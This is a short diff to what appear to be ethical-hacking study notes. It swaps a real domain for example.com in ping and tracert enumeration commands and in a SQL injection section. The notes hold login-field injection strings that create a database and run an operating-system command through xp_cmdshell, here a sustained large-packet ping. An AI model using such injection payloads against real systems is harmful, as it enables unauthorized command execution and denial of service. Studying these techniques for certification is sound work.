@@ -2,8 +2,8 @@
 
 ### >>> Module 02 : Enumeration 
 ```
-ping www.moviescope.com –f –l 1500 -> Frame size
-tracert www.moviescope.com -> Determining hop count
+ping www.example.com –f –l 1500 -> Frame size
+tracert www.example.com -> Determining hop count
 ```
 
 ### >> Enumeration using Metasploit :
@@ -170,7 +170,7 @@ Create database from login
 blah';create database mydatabase;
 
 Execute cmd from login
-blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+blah';exec master..xp_cmdshell 'ping www.example.com -l 65000 -t'; --
 ```
 
 
